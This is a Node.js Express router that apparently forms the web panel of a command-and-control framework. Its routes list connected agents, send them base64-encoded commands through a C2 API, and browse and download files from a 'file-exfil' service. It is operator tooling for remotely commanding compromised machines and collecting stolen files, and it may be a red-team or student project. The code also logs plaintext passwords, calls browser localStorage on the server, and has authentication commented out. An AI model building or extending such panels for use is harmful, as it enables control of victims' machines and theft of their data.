var express = require('express');
var router = express.Router();
var axios = require('axios');

/* make a post request to the user-api for login */
router.post('/login', function(req, res, next) {
    // hash the password
    var reqPassword = req.body.password;
    console.log('username: ' + req.body.username)
    console.log('reqPassword: ' + reqPassword);

    // make a post request to the user-api for login
    axios.post('http://user-api:8002/users/login', {
        username: String(req.body.username),
        hashedPassword: String(reqPassword)
    },
    {
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(function (response) {
        if (response.status === 200) {
            //login successful, save the token
            localStorage.setItem({token: response.data.access_token, username: req.body.username});
            res.redirect('/');
        } else {
            //login failed
            console.log('login failed');
            res.redirect('/login');
        }
    })
    .catch(function (error) {
        console.log(error);
    });
});

router.get('/agents/all', function(req, res, next) {
    axios.get('http://c2-api:8001/c2/list-connections', {
        // headers: {
        //     Authorization: 'Bearer ' + localStorage.getItem('token')
        // }
    })
    .then(function (response) {
        // Check if response.data is an array
        console.log(response.data.connection_list);
        if (response.data.connection_list.length > 0) {
            res.json(response.data.connection_list);
        } else {
            console.log('No data returned from API');
        }
    
    })
    .catch(function (error) {
        console.log(error);
    });
});

router.get('/agents/:agentID', function(req, res, next) {
    // make a get request to the agent-api for agent details
    axios.get('http://c2-api:8001/c2/get-connection/' + req.params.agentID, {
    })
    .then(function (response) {
        // Check if response.data is an array
        console.log(response.data);
        if (response.data.length > 0) {
            res.render('agent', {agent: response.data});
        } else {
            console.log('No data returned from API');
        }
    
    })
    .catch(function (error) {
        console.log(error);
    });
});

router.post('/agent/:agentID/command', function(req, res, next) {
    console.log('agentID for adding command: ' + req.params.agentID);
    // decode command with base64 using UTF-8
    let utf8str = atob(req.body.command);
    let command = decodeURIComponent(escape(utf8str));

    console.log('command: ' + command);

    // make a post request to the agent-api for agent details
    axios.post('http://c2-api:8001/c2/add-command/' + req.params.agentID, {
        command: command
    })
    .then(function (response) {
        // Check if response.data is an array
        console.log(response.data);
        if (response.data.length) {
            res.send('Command sent');
        } else {
            console.log('No data returned from API');
            res.send('Command failed to send');
        }
    
    })
    .catch(function (error) {
        console.log(error);
    });
});

router.get('/agent/:agentID/tasks', function(req, res, next) {
    const agentID = req.params.agentID;

    // make a get request to the agent-api for agent details
    axios.get('http://c2-api:8001/c2/get-command-list/' + agentID, {
    })
    .then(function (response) {
        // Check if response.data is an array
        console.log(response.data.task_list);
        if (response.data.task_list) {
            res.send({tasks: response.data.task_list});
        } else {
            console.log('No data returned from API');
        }
    
    })
    .catch(function (error) {
        console.log(error);
    });
});

// ----------------------------------------

// route to get all files
router.get('/files/all', function(req, res, next) {
    axios.get('http://file-api:8003/file-exfil/list-files', {
    })
    .then(function (response) {
        // Check if response.data is an array
        console.log('returned data from file-api:');
        console.log(response.data.file_list);
        if (response.data.file_list) {
            res.send({files: response.data.file_list});
        } else {
            console.log('No data returned from API');
        }
    
    })
    .catch(function (error) {
        console.log(error);
    });
});

// download file
router.get('/files/download/:fileID', function(req, res, next) {
    // make a get request to the file-api for file details
    axios.get('http://file-api:8003/file-exfil/download/' + req.params.fileID, {
    })
    .then(function (response) {
        // Check if response.data is an array
        console.log('returned data from file-api:')
        console.log(response.data);
        console.log(response.headers)
        console.log(response.headers['content-disposition'].split('filename=')[1]);
        if (response.data) {
            let filename = String(response.headers['content-disposition'].split('filename=')[1]);

            // Set the headers
            res.setHeader('Content-Disposition', 'attachment; filename=' + filename);
            res.setHeader('Content-Type', 'application/octet-stream');

            // Send the file content
            res.send(response.data);
        } else {
            console.log('No data returned from API');
        }
    
    })
    .catch(function (error) {
        console.log(error);
    });
});

module.exports = router;